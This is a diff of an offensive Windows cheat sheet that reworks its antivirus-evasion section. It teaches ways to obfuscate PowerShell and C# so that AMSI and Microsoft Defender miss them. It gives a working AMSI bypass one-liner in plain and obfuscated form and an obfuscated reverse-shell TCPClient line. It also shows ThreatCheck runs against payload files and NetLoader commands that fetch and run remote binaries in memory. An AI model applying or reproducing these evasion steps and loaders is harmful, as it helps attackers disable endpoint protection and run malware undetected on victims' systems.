@@ -11,7 +11,10 @@
 	* [Logging evasion](#Logging-evasion)
 	* [Just Enough Admin](#Just-Enough-Admin)
 * [Windows Defender](#Windows-Defender)
-* [AV Bypass](#AV-Bypass)
+* [Defeating AV](#Defeating-AV)
+  * [Obfuscation tools](#Obfuscation-tools)
+  * [Obfuscation techniques](#Obfuscation-techniques)
+  * [Defeating Microsoft Defender](#Defeating-Microsoft-Defender)
   * [Windows Subsystem for Linux WSL](#Windows-Subsystem-for-Linux-WSL)
 * [Privileges](#Privileges)
 * [UAC Bypass](#UAC-bypass)
@@ -405,15 +408,9 @@ powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enable
 netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protocol=TCP localport=<PORT>
 ```
 
-## AV Bypass
-
-### Bypassing Microsoft Defender
-- Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck
-1. Run Defendercheck ```DefenderCheck.exe <PATH TO BINARY>```
-2. Replace string which gets detected.
-3. Recompile and check again!
-
-### Bypassing AV C# binaries
+## Defeating AV
+### Obfuscation tools
+#### C# binaries
 - Obfuscate C# binary with https://github.com/mkaring/ConfuserEx
 1. Launch ConfuserEx
 2. In Project tab select the Base Directory where the binary file is located.
@@ -423,15 +420,90 @@ netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protoc
 6. In Protect tab click on the protect button.
 7. We will find the new obfuscated binary in the Confused folder under the Base Directory.
 
-### Bypassing AV Go binaries
+#### Go binaries
 - https://github.com/burrowers/garble
 
-### Obfuscate scripts
-- Remove comments https://github.com/yoda66/PowerStrip
-- Remove all comments + whitespaces http://www.powertheshell.com/
-- Check for amsi strings https://github.com/RythmStick/AMSITrigger
-- Obfuscate strings https://github.com/danielbohannon/Invoke-Obfuscation
-- https://github.com/JoelGMSec/Invoke-Stealth
+#### Powershell
+- [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+- [https://github.com/JoelGMSec/Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
+
+### Obfuscation techniques
+- Examples are in PowerShell but techniques can be implemented in every coding language
+- The code is evaluated when its readable by the scripting engine
+- This is what allows us to still be able ot obfuscate our code
+```
+# This
+powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIASABlAGwAbABvACAAVwBvAHIAbABkACIAKQA=
+
+# Becomes
+Write-Host("Hello World")
+
+# But This
+Write-Host("He" + "llo" + "World")
+
+# Does not become
+Write-Host("Hello World")
+```
+
+### Change the following:
+#### Hash of file/code
+ - Capitalization 
+	 - PowerShell ignores capitalization, AMSI ignored capitalization, but chaning your hash is best practice.
+		 -   `$variablename = "amsicontext"` to `$VaRiAbLeNaMe = "amsicontext"`
+	- C# is case sensitive, but changing the capitalization changes the hash. (Must change every entry of the variable!)
+- Remove comments
+	- Remove all comments out of the script/code
+		- https://powershell.one/isesteroids/quickstart/overview
+		- https://github.com/yoda66/PowerStrip
+
+#### Byte strings
+- Change variable names
+	- `$variablename = "amsicontext"` to `$LoremIpsum = "amsicontext"`
+- Concatenation
+	- `"amsicontext"` to ``"am" + "si" + "con" + "te" + "xt"`
+- Variable insertion
+	- `$variablename = 'context'` into ``$variablename2 = "Amsi$variablename"`
+	- C# `string variablename = "context"; string variablename2 = $"amsi{variablename}";`
+	- Format string
+		- `$variablename = "amsi{0}text -f "con"`
+		- `$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);` to `$client = New-Object ("{0}{1}" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')("10.10.10.10",80);`
+		- C# `string variablename = "context"; string variablename2 = String.Format("amsi{0}",variablename);`
+- Potentially the order of execution
+- For C# changing the variable type (i.e list vs array)
+- Encrypted strings
+- Properties of an object
+	- Can be obfuscated with backticks `$notify.icon` to ```$notify."i`c`on"```
+
+#### Structure of the code
+- Change methods and lines of code around. 
+
+#### Example of amsi bypass
+```
+# Original amsi bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# New
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
+```
+
+### Defeating Microsoft Defender
+- Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck
+1. Run Threatcheck ```.\ThreatCheck.exe -f .\shell.exe```
+2. Replace string which gets detected.
+3. Recompile and check again!
+
+### Scanning amsi
+#### Threatcheck
+- https://github.com/rasta-mouse/ThreatCheck
+```
+.\ThreatCheck.exe -f .\shell.ps1 -e AMSI
+```
+
+#### AmsiTrigger
+- https://github.com/RythmStick/AMSITrigger
+```
+.\AmsiTrigger.exe -i .\shell.ps1 -f 2
+```
 
 ### Offensive .NET
 - https://github.com/Flangvik/NetLoader
@@ -443,12 +515,6 @@ C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
 #### Use custom exe Assembyload to run netloader in memory and then load binary
 ```
 C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
-```
-
-#### Compile defendercheck
-- Using visual studio code
-```
-csc.exe /target:exe /out:C:\tools\defendercheck.exe C:\Tools\DefenderCheck\DefenderCheck\DefenderCheck\Program.cs
 ```
 
 #### Random notes
